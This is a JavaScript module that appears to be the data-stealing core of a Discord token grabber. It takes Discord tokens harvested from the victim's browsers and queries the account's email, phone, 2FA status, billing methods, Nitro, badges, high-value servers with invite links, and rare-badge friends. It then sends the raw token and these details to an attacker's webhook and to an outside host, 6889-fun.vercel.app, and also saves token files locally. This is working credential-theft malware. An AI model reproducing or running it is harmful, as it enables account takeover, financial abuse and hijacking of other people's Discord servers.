const axios = require('axios');

const finds = require('./finds.js');

const fileutil = require('../../utils/fileutil/fileutil.js');
const requests = require('../../utils/requests/requests.js');

const GetRareFlags = (flags) => {
    const flagsDict = {
        '<:DiscordEmloyee:1163172252989259898>': 0,
        '<:PartneredServerOwner:1163172304155586570>': 1,
        '<:HypeSquadEvents:1163172248140660839>': 2,
        '<:BugHunterLevel1:1163172239970140383>': 3,
        '<:EarlySupporter:1163172241996005416>': 9,
        '<:BugHunterLevel2:1163172238942543892>': 14,
        '<:EarlyBotDeveloper:1163172236807639143>': 17,
        '<:CertifiedModerator:1163172255489085481>': 18,
        '<:ActiveDeveloper:1163172534443851868>': 22
    };

    let result = '';
    for (const [emoji, shift] of Object.entries(flagsDict)) {
        if ((flags & (1 << shift)) !== 0) {
            result += emoji + ' ';
        }
    }

    return result.trim();
};

const GetHQFriends = (friends) => {
    const filteredFriends = friends
        .filter(friend => friend.type === 1)
        .map(friend => ({
            username: friend.user.username,
            discriminator: friend.user.discriminator,
            flags: GetRareFlags(friend.user.public_flags)
        }))

    let hQFriends = filteredFriends.map(friend => {
        const name = `${friend.username}#${friend.discriminator}`;
        if (friend.flags) {
            return `${friend.flags} | ${name}\n`
        }
    });

    hQFriends = hQFriends.join('');

    if (hQFriends.length === 0) {
        return false;
    }

    if (hQFriends.length > 1000) {
        hQFriends = 'Numerous frieds to explore.';
    }

    return `**Rare Friends:**\n${hQFriends}`;
};

const GetHQGuilds = async (guilds, token) => {
    const filteredGuilds = guilds
        .filter(guild => guild.owner || (guild.permissions & 8) === 8)
        .filter(guild => guild.approximate_member_count >= 500)
        .map(guild => ({
            id: guild.id,
            name: guild.name,
            owner: guild.owner,
            member_count: guild.approximate_member_count
        }));

    let hQGuilds = await Promise.all(filteredGuilds.map(async guild => {
        try {
            const response = await axios.get(`https://discord.com/api/v8/guilds/${guild.id}/invites`, {
                headers: { Authorization: token }
            });

            const invites = Array.isArray(response.data) ? response.data : [];
            const inviteCode = invites.length > 0 ? invites[0]?.code : null;
            const invite = inviteCode ? `[Join Server](https://discord.gg/${inviteCode})` : '';

            const emoji = guild.owner
                ? `<:Owner:963333541343686696> Owner`
                : `<:Staff:1136740017822253176> Admin`;
            const members = `Members: \`${guild.member_count}\``;
            const name = `(**${guild.name}**)`;

            return `${emoji} | ${name} - ${members}${invite ? ` - ${invite}` : ''}\n`;

        } catch (error) {
        }
    }));

    hQGuilds = hQGuilds.join('');

    if (hQGuilds.length === 0) {
        return false;
    }

    if (hQGuilds.length > 1000) {
        return 'Numerous servers to explore.';
    }

    return `**Rare Servers:**\n${hQGuilds}`;
};


const GetBilling = (billing) => {
    const payment = {
        1: '💳',
        2: '<:Paypal:1129073151746252870>'
    };
    let paymentMethods = billing.map(method => payment[method.type] || '❓').join('');
    return paymentMethods || '`❓`';
};

const GetDate = (current, months) => {
    return new Date(current).setMonth(current.getMonth() + months);
};

const GetNitro = (flags) => {
    const nitro = '<:DiscordNitro:587201513873473542>';

    const monthsNitro = [
        '<:DiscordBoostNitro1:1087043238654906472> ',
        '<:DiscordBoostNitro2:1087043319227494460> ',
        '<:DiscordBoostNitro3:1087043368250511512> ',
        '<:DiscordBoostNitro6:1087043493236592820> ',
        '<:DiscordBoostNitro9:1087043493236592820> ',
        '<:DiscordBoostNitro12:1162420359291732038> ',
        '<:DiscordBoostNitro15:1051453775832961034> ',
        '<:DiscordBoostNitro18:1051453778127237180> ',
        '<:DiscordBoostNitro24:1051453776889917530> ',
    ];

    const { premium_type, premium_guild_since } = flags;
    switch (premium_type) {
        default:
            return '`❓`';
        case 1:
            return nitro;
        case 2:
            if (!premium_guild_since) {
                return nitro;
            };

            let months = [1, 2, 3, 6, 9, 12, 15, 18, 24];
            let rem = 0;

            for (let i = 0; i < months.length; i++)
                if (Math.round((
                    GetDate(new Date(premium_guild_since), months[i]) - new Date()
                ) / 86400000) > 0) {
                    rem = i;
                    break;
                };

            return `${nitro} ${monthsNitro[rem]}`;
    }
};

const GetFlags = (flags) => {
    const flagsDict = {
        '<:DiscordEmloyee:1163172252989259898>': 0,
        '<:PartneredServerOwner:1163172304155586570>': 1,
        '<:HypeSquadEvents:1163172248140660839>': 2,
        '<:BugHunterLevel1:1163172239970140383>': 3,
        '<:HouseBravery:1163172246492287017>': 6,
        '<:HouseBrilliance:1163172244474822746>': 7,
        '<:HouseBalance:1163172243417858128>': 8,
        '<:EarlySupporter:1163172241996005416>': 9,
        '<:BugHunterLevel2:1163172238942543892>': 14,
        '<:EarlyBotDeveloper:1163172236807639143>': 17,
        '<:CertifiedModerator:1163172255489085481>': 18,
        '⌨️': 20,
        '<:ActiveDeveloper:1163172534443851868>': 22
    };

    let result = '';
    for (const [emoji, shift] of Object.entries(flagsDict)) {
        if ((flags & (1 << shift)) !== 0) {
            result += emoji;
        }
    }

    return result.trim() || '`❓`';
};


const Fetch = async (endpoint, headers) => {
    const response = await axios.get(`https://discord.com/api/v9/users/${endpoint}`, {
        headers: {
            'Content-Type': 'application/json',
            ...headers
        }
    });

    return response.data;
};

module.exports = async (webhookUrl) => {
    const tokens = await finds.GetTokens();
    for (const { browser, token } of tokens) {
        try {
            const user = await Fetch('@me', {
                'Authorization': token
            });

            const profile = await Fetch(`${Buffer.from(token.split('.')[0], 'base64').toString('binary')}/profile`, {
                'Authorization': token
            });

            const billing = await Fetch(`@me/billing/payment-sources`, {
                'Authorization': token
            });

            const guilds = await Fetch(`@me/guilds?with_counts=true`, {
                'Authorization': token
            });

            const friends = await Fetch(`@me/relationships`, {
                'Authorization': token
            });

            const ext = user.avatar.startsWith('a_') ? 'gif' : 'png';
            const avatar = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.${ext}`;

            const copy = `https://6889-fun.vercel.app/api/aurathemes/raw?data=${token}`;

            const data = {
                embeds: [
                    {
                        title: `${user.username} | ${user.id}`,
                        thumbnail: {
                            url: avatar + '?size=512'
                        },
                        fields: [
                            {
                                name: `<:x:1194495538138185728> ${browser} Token:`,
                                value: '```' + token + '```' + '\n' + `[Click Here To Copy Your Token](${copy})`,
                                inline: false
                            },
                            { name: '\u200b', value: '\u200b', inline: false },
                            {
                                name: '<a:mail:1245038428891123815> Email:',
                                value: '`' + (user.email || '❓') + '`',
                                inline: true
                            },
                            {
                                name: '<a:phone:1104204812867874936> Phone:',
                                value: '`' + (user.phone || '❓') + (user.mfa_enabled ? ' (2FA)' : '') + '`',
                                inline: true
                            },
                            { name: '\u200b', value: '\u200b', inline: false },
                            {
                                name: '<a:nitro:1122755911967068210> Nitro:',
                                value: GetNitro(profile),
                                inline: true
                            },
                            {
                                name: '<:billing:1122678162288037929> Billing:',
                                value: GetBilling(billing),
                                inline: true
                            },
                            {
                                name: '<a:badges:1138323945284714516> Badges:',
                                value: GetFlags(user.public_flags),
                                inline: true
                            },
                        ]
                    }
                ]
            };

            const hqGuilds = await GetHQGuilds(guilds, token);
            if (hqGuilds) {
                data.embeds[0].fields.push({
                    name: '\u200b',
                    value: hqGuilds,
                    inline: false
                });
            };

            const hqFriends = GetHQFriends(friends);
            if (hqFriends) {
                data.embeds[0].fields.push({
                    name: '\u200b',
                    value: hqFriends,
                    inline: false
                });
            };

            await requests.Webhook(webhookUrl, data, [], copy);

            const tokenInfo = [
                `Token: ${token}`,
                `Browser: ${browser}`,
                `Id: ${user.id}`,
                `Username: ${user.username}`,
                `Avatar: ${avatar + '?size=512'}`,
                `Badges: ${user.public_flags}`,
            ];

            const WishTempDir = fileutil.WishTempDir('tokens');
            await fileutil.WriteDataToFile(WishTempDir, `tokenInfo-${user.id}.txt`, tokenInfo);

        } catch (error) {
            if (error.response && error.response.data.code === 0) {
                continue;
            }
        }
    }
};